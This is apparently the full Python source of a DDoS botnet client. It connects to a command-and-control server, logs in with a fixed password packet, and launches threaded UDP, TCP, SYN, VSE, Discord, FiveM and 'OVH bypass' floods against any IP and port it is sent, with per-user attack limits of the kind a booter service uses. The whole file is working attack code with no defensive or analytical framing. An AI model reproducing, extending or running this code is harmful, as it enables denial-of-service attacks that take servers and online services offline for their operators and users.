
import socket
import threading
import time
import random
import struct
import subprocess
import signal
import sys
import os
import errno
import select

# Configuration
C2_ADDRESS = "0.0.0.0"
C2_PORT = 1337
MAX_USERS = 50
MAX_ATTACKS_PER_USER = 10
BUFFER_SIZE = 2048
MAX_THREADS = 1400

# Payloads
payload_vse = b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"
payload_discord2 = b"\x94\x00\xb0\x1a\xef\x69\xa8\xa1\x59\x69\xba\xc5\x08\x00\x45\x00\x00\x43\xf0\x12\x00\x00\x80\x11\x00\x00\xc0\xa8\x64\x02\xb9\x29\x8e\x31\xc2\x30\xc3\x51\x00\x2f\x6c\x46\x90\xf8\x5f\x1b\x8e\xf5\x56\x8f\x00\x05\xe1\x26\x96\xa9\xde\xe8\x84\xba\x65\x38\x70\x68\xf5\x70\x0e\x12\xe2\x54\x20\xe0\x7f\x49\x0d\x9e\x44\x89\xec\x4b\x7f"
payload_fivem = b"\x74\x6f\x6b\x65\x6e\x3d\x64\x66\x39\x36\x61\x66\x30\x33\x2d\x63\x32\x66\x63\x2d\x34\x63\x32\x39\x2d\x39\x31\x39\x61\x2d\x32\x36\x30\x35\x61\x61\x37\x30\x62\x31\x66\x38\x26\x67\x75\x69\x64\x3d\x37\x36\x35\x36\x31\x31\x39\x38\x38\x30\x34\x38\x30\x36\x30\x31\x35"

hex_values = [2, 4, 8, 16, 32, 64, 128]
hex_count = 7

packet_sizes = [1024, 2048]
packet_sizes_count = 2

# Thread control structure
class AttackThread:
    def __init__(self):
        self.thread_id = None
        self.active = 0
        self.stop = 0

# User attack tracking
class UserAttack:
    def __init__(self):
        self.username = ""
        self.attacks = [AttackThread() for _ in range(MAX_ATTACKS_PER_USER)]
        self.attack_count = 0

user_attacks = [UserAttack() for _ in range(MAX_USERS)]
user_count = 0

# Attack parameters structure
class AttackParams:
    def __init__(self):
        self.ip = ""
        self.port = 0
        self.end_time = 0
        self.stop_flag = None

# Get system architecture
def get_architecture():
    try:
        result = subprocess.run(['uname', '-m'], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return "unknown"
    except:
        return "unknown"

# Generate random data
def generate_random_data(size):
    return bytes([random.randint(0, 255) for _ in range(size)])

# Generate end string
def generate_end(length):
    chars = "\n\r"
    end = ''.join(random.choice(chars) for _ in range(length))
    return end

# OVH packet builder
def ovh_builder(ip, port):
    packet_list = []
    packet_count = 0
    
    for h2_idx in range(hex_count):
        for h_idx in range(hex_count):
            # Generate random part (2048 bytes)
            random_part = generate_random_data(2048)
            
            paths = [
                "/0/0/0/0/0/0",
                "/0/0/0/0/0/0/",
                "\\0\\0\\0\\0\\0\\0",
                "\\0\\0\\0\\0\\0\\0\\"
            ]
            
            for p in range(4):
                end = generate_end(4)
                # Limit random part to 256 bytes for simplicity
                random_part_limited = random_part[:256]
                
                packet = f"PGET {paths[p]}{random_part_limited.decode('latin-1')} HTTP/1.1\nHost: {ip}:{port}{end}"
                packet_list.append(packet.encode('latin-1'))
                packet_count += 1
                
                if packet_count >= 1000:
                    return packet_list
    
    return packet_list

# Attack functions
def attack_ovh_tcp(params):
    sock = None
    sock2 = None
    
    try:
        packets = ovh_builder(params.ip, params.port)
        
        while time.time() < params.end_time and not params.stop_flag[0]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                sock.settimeout(5)
                sock2.settimeout(5)
                
                try:
                    sock.connect((params.ip, params.port))
                    sock2.connect((params.ip, params.port))
                    
                    for packet in packets:
                        for j in range(10):
                            try:
                                sock.send(packet)
                                sock2.send(packet)
                            except:
                                break
                except:
                    pass
                
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                if sock2:
                    try:
                        sock2.close()
                    except:
                        pass
                sock = None
                sock2 = None
    except Exception as e:
        pass

def attack_ovh_udp(params):
    print("[DEBUG] OVH-UDP ataque iniciado")
    sock = None
    
    try:
        packets = ovh_builder(params.ip, params.port)
        
        while time.time() < params.end_time and not params.stop_flag[0]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for packet in packets:
                    for j in range(10):
                        try:
                            sock.sendto(packet, (params.ip, params.port))
                        except:
                            break
                            
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                sock = None
    except Exception as e:
        pass

def attack_vse(params):
    print("[DEBUG] VSE ataque iniciado")
    sock = None
    
    try:
        while time.time() < params.end_time and not params.stop_flag[0]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload_vse, (params.ip, params.port))
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                sock = None
    except Exception as e:
        pass

# Discord attack function
def attack_discord2(params):
    print("[DEBUG] Discord2 ataque iniciado")
    sock = None
    
    try:
        while time.time() < params.end_time and not params.stop_flag[0]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Send the discord2 payload
                sock.sendto(payload_discord2, (params.ip, params.port))
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                sock = None
    except Exception as e:
        pass
    
    print("[DEBUG] Discord2 ataque parado")

def attack_fivem(params):
    print("[DEBUG] fivem ataque iniciado")
    sock = None
    
    try:
        while time.time() < params.end_time and not params.stop_flag[0]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Send the fivem payload
                sock.sendto(payload_fivem, (params.ip, params.port))
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                sock = None
    except Exception as e:
        pass
    
    print("[DEBUG] fivem ataque parado")

def attack_udp_bypass(params):
    print("[DEBUG] UDP ataque iniciado")
    sock = None
    
    try:
        while time.time() < params.end_time and not params.stop_flag[0]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                packet_size = packet_sizes[random.randint(0, packet_sizes_count - 1)]
                packet = generate_random_data(packet_size)
                
                sock.sendto(packet, (params.ip, params.port))
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                sock = None
    except Exception as e:
        pass
    
    print("[DEBUG] UDP ataque parado")

def attack_tcp_bypass(params):
    sock = None
    
    try:
        while time.time() < params.end_time and not params.stop_flag[0]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                packet_size = packet_sizes[random.randint(0, packet_sizes_count - 1)]
                packet = generate_random_data(packet_size)
                
                try:
                    sock.connect((params.ip, params.port))
                    while time.time() < params.end_time and not params.stop_flag[0]:
                        try:
                            sock.send(packet)
                        except:
                            break
                except:
                    pass
                    
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                sock = None
    except Exception as e:
        pass

def attack_tcp_udp_bypass(params):
    sock = None
    
    try:
        while time.time() < params.end_time and not params.stop_flag[0]:
            try:
                use_tcp = random.randint(0, 1)
                
                if use_tcp:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                packet_size = packet_sizes[random.randint(0, packet_sizes_count - 1)]
                packet = generate_random_data(packet_size)
                
                if use_tcp:
                    try:
                        sock.connect((params.ip, params.port))
                        sock.send(packet)
                    except:
                        pass
                else:
                    sock.sendto(packet, (params.ip, params.port))
                    
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                sock = None
    except Exception as e:
        pass

def attack_syn(params):
    sock = None
    
    try:
        while time.time() < params.end_time and not params.stop_flag[0]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                # Set non-blocking
                sock.setblocking(False)
                
                packet_size = packet_sizes[random.randint(0, packet_sizes_count - 1)]
                packet = generate_random_data(packet_size)
                
                try:
                    sock.connect((params.ip, params.port))
                except socket.error as e:
                    if e.errno != errno.EINPROGRESS and e.errno != errno.EWOULDBLOCK:
                        pass
                
                try:
                    sock.send(packet)
                except:
                    pass
                    
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                sock = None
    except Exception as e:
        pass

# Start an attack with specified method
def start_attack(method, ip, port, duration, thread_count, username):
    global user_count
    
    print(f"[DEBUG] start_attack called with method={method}, ip={ip}, port={port}, duration={duration}, threads={thread_count}, user={username}")
    
    user_index = -1
    
    # Find or create user
    for i in range(user_count):
        if user_attacks[i].username == username:
            user_index = i
            print(f"[DEBUG] Found existing user at index {user_index}")
            break
    
    if user_index == -1:
        if user_count >= MAX_USERS:
            print("[ERROR] Too many users, cannot add new user")
            return  # Too many users
        
        user_index = user_count
        user_count += 1
        user_attacks[user_index].username = username
        user_attacks[user_index].attack_count = 0
        print(f"[DEBUG] Created new user at index {user_index}")
    
    # Check if user already has max attacks
    if user_attacks[user_index].attack_count >= MAX_ATTACKS_PER_USER:
        print(f"[ERROR] User {username} already has maximum number of attacks ({MAX_ATTACKS_PER_USER})")
        return
    
    # Find empty thread slot
    attack_index = user_attacks[user_index].attack_count
    print(f"[DEBUG] Using attack index {attack_index} for new attack")
    
    # Initialize stop flag
    user_attacks[user_index].attacks[attack_index].stop = 0
    user_attacks[user_index].attacks[attack_index].active = 1
    
    # Choose attack function based on method
    attack_func = None
    
    if method == ".udp":
        print("[DEBUG] Selected UDP attack method")
        attack_func = attack_udp_bypass
    elif method == ".tcp":
        print("[DEBUG] Selected TCP attack method")
        attack_func = attack_tcp_bypass
    elif method == ".mix":
        print("[DEBUG] Selected MIX attack method")
        attack_func = attack_tcp_udp_bypass
    elif method == ".syn":
        print("[DEBUG] Selected SYN attack method")
        attack_func = attack_syn
    elif method == ".vse":
        print("[DEBUG] Selected VSE attack method")
        attack_func = attack_vse
    elif method == ".discord":
        print("[DEBUG] Selected Discord2 attack method")
        attack_func = attack_discord2
    elif method == ".fivem":
        print("[DEBUG] Selected fivem attack method")
        attack_func = attack_fivem
    elif method == ".ovhtcp":
        print("[DEBUG] Selected OVHTCP attack method")
        attack_func = attack_ovh_tcp
    elif method == ".ovhudp":
        print("[DEBUG] Selected OVHUDP attack method")
        attack_func = attack_ovh_udp
    else:
        print(f"[ERROR] Unknown attack method: {method}")
        return
    
    if attack_func is None:
        print("[ERROR] Failed to assign attack function")
        return
    
    print(f"[DEBUG] Starting {thread_count} attack threads")
    successful_threads = 0
    
    # Start all threads
    for i in range(min(thread_count, MAX_THREADS)):
        thread_params = AttackParams()
        thread_params.ip = ip
        thread_params.port = port
        thread_params.end_time = time.time() + duration
        thread_params.stop_flag = [user_attacks[user_index].attacks[attack_index].stop]
        
        try:
            thread = threading.Thread(target=attack_func, args=(thread_params,))
            user_attacks[user_index].attacks[attack_index].thread_id = thread
            thread.start()
            successful_threads += 1
        except Exception as e:
            print(f"[ERROR] Failed to create thread {i}: {e}")
    
    if successful_threads > 0:
        user_attacks[user_index].attack_count += 1
        print(f"[SUCCESS] Started attack with {successful_threads}/{thread_count} threads")
    else:
        print("[ERROR] Failed to start any attack threads")

# Stop all attacks for a user
def stop_attacks(username):
    user_index = -1
    
    # Find user
    for i in range(user_count):
        if user_attacks[i].username == username:
            user_index = i
            break
    
    if user_index == -1:
        return  # User not found
    
    # Set stop flags for all attacks
    for i in range(user_attacks[user_index].attack_count):
        user_attacks[user_index].attacks[i].stop = 1
        if user_attacks[user_index].attacks[i].thread_id:
            try:
                user_attacks[user_index].attacks[i].thread_id.join()
            except:
                pass
    
    user_attacks[user_index].attack_count = 0

# Main function
def main():
    global user_attacks, user_count
    
    print("main function ...")
    connected = 0
    
    # Initialize random seed
    random.seed(time.time())
    
    # Initialize the user_attacks array
    user_attacks = [UserAttack() for _ in range(MAX_USERS)]
    user_count = 0
    
    # Ignore SIGPIPE to prevent crashes on socket write errors
    signal.signal(signal.SIGPIPE, signal.SIG_IGN)
    
    while True:
        try:
            c2_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Set socket options
            c2_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            try:
                c2_sock.connect((C2_ADDRESS, C2_PORT))
            except:
                c2_sock.close()
                time.sleep(20)
                continue
            
            # Wait for Username prompt
            time.sleep(1)
            print("Wait for Username prompt ...")
            
            try:
                buffer = c2_sock.recv(BUFFER_SIZE)
                buffer = buffer.decode('latin-1', errors='ignore')
                
                if "Username" in buffer:
                    # Send architecture
                    print("get_architecture ...")
                    arch = get_architecture()
                    c2_sock.send(arch.encode('latin-1'))
                    
                    # Wait for Password prompt
                    buffer = c2_sock.recv(BUFFER_SIZE)
                    buffer = buffer.decode('latin-1', errors='ignore')
                    
                    if "Password" in buffer:
                        # Send special password packet
                        passwd = b"\xff\xff\xff\xff\x75"
                        c2_sock.send(passwd)
                        
                        print("connected!")
                        connected = 1
                
                if connected:
                    print("connected = 1")
                    while True:
                        try:
                            buffer = c2_sock.recv(BUFFER_SIZE)
                            if len(buffer) <= 0:
                                break
                            
                            buffer = buffer.decode('latin-1', errors='ignore')
                            
                            # Remove newline
                            buffer = buffer.strip('\n\r')
                            
                            # Parse command
                            tokens = buffer.split(' ')
                            if len(tokens) == 0:
                                continue
                            
                            command = tokens[0]
                            
                            if command == "PING":
                                c2_sock.send(b"PONG")
                            elif command == "STOP":
                                if len(tokens) > 1:
                                    stop_attacks(tokens[1])
                            else:
                                # Treat as attack command
                                # Format: METHOD IP PORT SECONDS THREADS [USERNAME]
                                if len(tokens) >= 5:
                                    ip = tokens[1]
                                    port = int(tokens[2])
                                    duration = int(tokens[3])
                                    threads = int(tokens[4])
                                    username = tokens[5] if len(tokens) > 5 else "default"
                                    
                                    # Start attack
                                    start_attack(command, ip, port, duration, threads, username)
                        except Exception as e:
                            break
            except Exception as e:
                pass
            
        except Exception as e:
            pass
        finally:
            try:
                c2_sock.close()
            except:
                pass
            connected = 0
            time.sleep(20)

if __name__ == "__main__":
    main()

